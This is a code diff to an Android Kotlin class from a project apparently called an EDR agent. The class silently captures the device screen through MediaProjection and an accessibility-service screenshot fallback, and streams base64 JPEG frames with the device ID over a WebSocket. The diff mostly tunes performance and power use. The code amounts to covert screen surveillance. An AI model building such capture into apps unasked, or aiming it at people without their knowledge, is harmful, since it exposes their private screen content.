@@ -10,15 +10,15 @@ import android.media.ImageReader
 import android.media.projection.MediaProjection
 import android.media.projection.MediaProjectionManager
 import android.os.Handler
-import android.os.Looper
+import android.os.PowerManager
 import android.util.Base64
 import android.util.Log
+import com.edr.agent.network.EdrHttpClient
 import com.edr.agent.service.EdrAccessibilityService
 import com.edr.agent.storage.EdrLocalStorage
 import com.edr.agent.storage.SyncPreferences
 import com.google.gson.Gson
 import okhttp3.MediaType.Companion.toMediaType
-import okhttp3.OkHttpClient
 import okhttp3.Request
 import okhttp3.RequestBody.Companion.toRequestBody
 import java.io.ByteArrayOutputStream
@@ -58,19 +58,16 @@ object ScreenStreamManager {
     @Volatile
     private var nextAllowedScreenshotTime = 0L
 
-    // Reusable bitmap for zero-allocation 15 FPS image copying
+    // Reusable buffers for zero-allocation image copying & JPEG encoding
     private var reusableRawBitmap: Bitmap? = null
     private var reusableCleanBitmap: Bitmap? = null
     private var reusableByteArray: ByteArray? = null
+    private var reusableBaos: ByteArrayOutputStream? = null
 
     // Registered WebSocket sender lambda provided by EdrWebSocketClient
     var wsSender: ((String) -> Boolean)? = null
 
-    private val httpClient = OkHttpClient.Builder()
-        .connectTimeout(15, TimeUnit.SECONDS)
-        .writeTimeout(30, TimeUnit.SECONDS)
-        .readTimeout(30, TimeUnit.SECONDS)
-        .build()
+    private val httpClient = EdrHttpClient.apiClient
     private val gson = Gson()
     private val jsonMediaType = "application/json; charset=utf-8".toMediaType()
 
@@ -209,12 +206,25 @@ object ScreenStreamManager {
                 backgroundHandler
             )
 
+            val powerManager = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
+            if (reusableBaos == null) {
+                reusableBaos = ByteArrayOutputStream(32768)
+            }
+
+            // Cancel fallback Accessibility loop while VirtualDisplay is actively owning the stream
+            streamTask?.cancel(false)
+            streamTask = null
+
             imageReader!!.setOnImageAvailableListener({ reader ->
                 if (!isStreaming.get()) return@setOnImageAvailableListener
+                if (powerManager?.isInteractive == false) {
+                    reader.acquireLatestImage()?.close()
+                    return@setOnImageAvailableListener
+                }
 
                 val now = System.currentTimeMillis()
-                // Throttle to ~15 FPS (at least 65ms between frames)
-                if (now - lastVirtualDisplayFrameTime < 65) {
+                // Throttle to ~12-15 FPS (at least 70ms between frames) to keep CPU/thermals cool
+                if (now - lastVirtualDisplayFrameTime < 70) {
                     reader.acquireLatestImage()?.close()
                     return@setOnImageAvailableListener
                 }
@@ -257,7 +267,8 @@ object ScreenStreamManager {
                             Bitmap.createBitmap(rawBitmap, 0, 0, targetWidth, targetHeight)
                         }
 
-                        val bos = ByteArrayOutputStream()
+                        val bos = reusableBaos ?: ByteArrayOutputStream(32768).also { reusableBaos = it }
+                        bos.reset()
                         cleanBitmap.compress(Bitmap.CompressFormat.JPEG, 50, bos)
                         val frameBytes = bos.toByteArray()
                         val base64 = Base64.encodeToString(frameBytes, Base64.NO_WRAP)
@@ -286,8 +297,8 @@ object ScreenStreamManager {
                         )
                         val sent = wsSender?.invoke(frameMsg) ?: false
 
-                        if (seq == 1L || seq % 15L == 1L) {
-                            EdrLocalStorage.appendEdrLog(context, "STREAM_VD", "VD Frame #$seq sent ($w x $h, ${frameBytes.size}B @ 15 FPS, wsSent: $sent)")
+                        if (seq == 1L || seq % 100L == 1L) {
+                            EdrLocalStorage.appendEdrLog(context, "STREAM_VD", "VD Frame #$seq sent ($w x $h, ${frameBytes.size}B, wsSent: $sent)")
                         }
                     } catch (e: Exception) {
                         Log.e(TAG, "Error encoding VirtualDisplay frame: ${e.message}", e)
@@ -296,11 +307,8 @@ object ScreenStreamManager {
                 }
             }, backgroundHandler)
 
-            Log.i(TAG, "VirtualDisplay 15 FPS capture engine running successfully!")
-            EdrLocalStorage.appendEdrLog(context, "STREAM", "VirtualDisplay 15 FPS capture engine running")
-
-            // Ensure fallback loop is alive as safety net for stationary screens
-            startAccessibilityFallbackLoop(context)
+            Log.i(TAG, "VirtualDisplay capture engine running cleanly (fallback loop paused).")
+            EdrLocalStorage.appendEdrLog(context, "STREAM", "VirtualDisplay capture engine running")
         } catch (e: Exception) {
             Log.e(TAG, "Failed creating VirtualDisplay: ${e.message}", e)
             EdrLocalStorage.appendEdrLog(context, "STREAM_ERR", "Failed creating VirtualDisplay: ${e.message}")
@@ -325,8 +333,18 @@ object ScreenStreamManager {
     private fun startAccessibilityFallbackLoop(context: Context) {
         if (streamTask != null && !streamTask!!.isCancelled) return
 
+        val powerManager = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
+        if (reusableBaos == null) {
+            reusableBaos = ByteArrayOutputStream(32768)
+        }
+
         streamTask = streamExecutor.scheduleWithFixedDelay({
             if (!isStreaming.get()) return@scheduleWithFixedDelay
+
+            // Pause GPU screenshot capture completely while screen is off
+            if (powerManager?.isInteractive == false) {
+                return@scheduleWithFixedDelay
+            }
 
             val now = System.currentTimeMillis()
             // If VirtualDisplay is actively delivering frames (within last 1200ms), no fallback needed!
@@ -360,34 +378,37 @@ object ScreenStreamManager {
                 service.takeSilentScreenshot(540) { scaledBitmap ->
                     try {
                         if (scaledBitmap != null && isStreaming.get()) {
-                            val bos = ByteArrayOutputStream()
-                            scaledBitmap.compress(Bitmap.CompressFormat.JPEG, 60, bos)
-                            val frameBytes = bos.toByteArray()
-                            val base64 = Base64.encodeToString(frameBytes, Base64.NO_WRAP)
-                            val w = scaledBitmap.width
-                            val h = scaledBitmap.height
-                            scaledBitmap.recycle()
+                            val bos = reusableBaos ?: ByteArrayOutputStream(32768).also { reusableBaos = it }
+                            synchronized(bos) {
+                                bos.reset()
+                                scaledBitmap.compress(Bitmap.CompressFormat.JPEG, 60, bos)
+                                val frameBytes = bos.toByteArray()
+                                val base64 = Base64.encodeToString(frameBytes, Base64.NO_WRAP)
+                                val w = scaledBitmap.width
+                                val h = scaledBitmap.height
+                                scaledBitmap.recycle()
 
-                            val seq = ++frameSequence
-                            val frameMsg = gson.toJson(
-                                mapOf(
-                                    "type" to "SCREEN_FRAME",
-                                    "deviceId" to SyncPreferences.deviceId,
-                                    "payload" to mapOf(
-                                        "frameBase64" to base64,
-                                        "seq" to seq,
-                                        "captureTime" to captureStartTime,
-                                        "timestamp" to SyncPreferences.getCurrentIsoTimestamp(),
-                                        "width" to w,
-                                        "height" to h,
-                                        "frameSizeBytes" to frameBytes.size
+                                val seq = ++frameSequence
+                                val frameMsg = gson.toJson(
+                                    mapOf(
+                                        "type" to "SCREEN_FRAME",
+                                        "deviceId" to SyncPreferences.deviceId,
+                                        "payload" to mapOf(
+                                            "frameBase64" to base64,
+                                            "seq" to seq,
+                                            "captureTime" to captureStartTime,
+                                            "timestamp" to SyncPreferences.getCurrentIsoTimestamp(),
+                                            "width" to w,
+                                            "height" to h,
+                                            "frameSizeBytes" to frameBytes.size
+                                        )
                                     )
                                 )
-                            )
 
-                            val sent = wsSender?.invoke(frameMsg) ?: false
-                            if (seq == 1L || seq % 5L == 1L) {
-                                EdrLocalStorage.appendEdrLog(service, "STREAM", "Fallback Frame #$seq sent ($w x $h, ${frameBytes.size}B, sent: $sent)")
+                                val sent = wsSender?.invoke(frameMsg) ?: false
+                                if (seq == 1L || seq % 50L == 1L) {
+                                    EdrLocalStorage.appendEdrLog(service, "STREAM", "Fallback Frame #$seq sent ($w x $h, ${frameBytes.size}B, sent: $sent)")
+                                }
                             }
                         } else {
                             // If screenshot failed (e.g. rate limit error 3), back off by 1200ms
@@ -431,6 +452,12 @@ object ScreenStreamManager {
             imageReader = null
             mediaProjection?.stop()
             mediaProjection = null
+            reusableRawBitmap?.recycle()
+            reusableRawBitmap = null
+            reusableCleanBitmap?.recycle()
+            reusableCleanBitmap = null
+            reusableByteArray = null
+            reusableBaos = null
         } catch (e: Exception) {
             Log.e(TAG, "Error releasing virtual display: ${e.message}")
             mediaProjection = null
